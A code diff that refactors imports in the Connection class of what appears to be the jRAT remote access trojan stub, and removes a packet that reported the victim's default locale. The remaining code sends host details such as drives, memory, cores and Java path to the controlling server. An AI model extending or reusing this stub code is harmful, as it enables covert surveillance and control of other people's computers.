@@ -6,11 +6,8 @@ import java.io.DataOutputStream;
 import java.io.File;
 import java.io.InputStream;
 import java.io.OutputStream;
-import java.lang.management.ManagementFactory;
-import java.net.InetAddress;
 import java.net.Socket;
 import java.security.PublicKey;
-import java.util.Locale;
 
 import javax.crypto.Cipher;
 import javax.crypto.CipherInputStream;
@@ -25,27 +22,24 @@ import se.jrat.common.crypto.KeyExchanger;
 import se.jrat.common.io.StringWriter;
 import se.jrat.stub.packets.incoming.AbstractIncomingPacket;
 import se.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
-import se.jrat.stub.packets.outgoing.Packet10InitDefaultLocale;
-import se.jrat.stub.packets.outgoing.Packet13Status;
-import se.jrat.stub.packets.outgoing.Packet1InitHandshake;
 import se.jrat.stub.packets.outgoing.Packet10InitInstallPath;
-import se.jrat.stub.packets.outgoing.Packet9InitJavaVersion;
-import se.jrat.stub.packets.outgoing.Packet26InitJavaPath;
-import se.jrat.stub.packets.outgoing.Packet12InitLocalAddress;
 import se.jrat.stub.packets.outgoing.Packet11InitInstallationDate;
+import se.jrat.stub.packets.outgoing.Packet12InitLocalAddress;
+import se.jrat.stub.packets.outgoing.Packet13InitTotalMemory;
+import se.jrat.stub.packets.outgoing.Packet13Status;
+import se.jrat.stub.packets.outgoing.Packet14InitAvailableCores;
+import se.jrat.stub.packets.outgoing.Packet1InitHandshake;
+import se.jrat.stub.packets.outgoing.Packet26InitJavaPath;
 import se.jrat.stub.packets.outgoing.Packet36Initialized;
 import se.jrat.stub.packets.outgoing.Packet4InitOperatingSystem;
 import se.jrat.stub.packets.outgoing.Packet5InitUserHost;
 import se.jrat.stub.packets.outgoing.Packet61InitMonitors;
 import se.jrat.stub.packets.outgoing.Packet62InitDrives;
-import se.jrat.stub.packets.outgoing.Packet13InitTotalMemory;
-import se.jrat.stub.packets.outgoing.Packet14InitAvailableCores;
 import se.jrat.stub.packets.outgoing.Packet67LoadedPlugins;
 import se.jrat.stub.packets.outgoing.Packet6InitVersion;
 import se.jrat.stub.packets.outgoing.Packet7InitServerID;
 import se.jrat.stub.packets.outgoing.Packet8InitCountry;
-
-import com.sun.management.OperatingSystemMXBean;
+import se.jrat.stub.packets.outgoing.Packet9InitJavaVersion;
 
 public class Connection implements Runnable {
 
@@ -156,18 +150,7 @@ public class Connection implements Runnable {
 		addToSendQueue(new Packet13InitTotalMemory());
 		addToSendQueue(new Packet14InitAvailableCores());
 
-
-
-				
-
-
-
 		addToSendQueue(new Packet26InitJavaPath(System.getProperty("java.home")));
-
-		
-
-
-		addToSendQueue(new Packet10InitDefaultLocale(Locale.getDefault()));
 
 		addToSendQueue(new Packet62InitDrives(File.listRoots()));
 
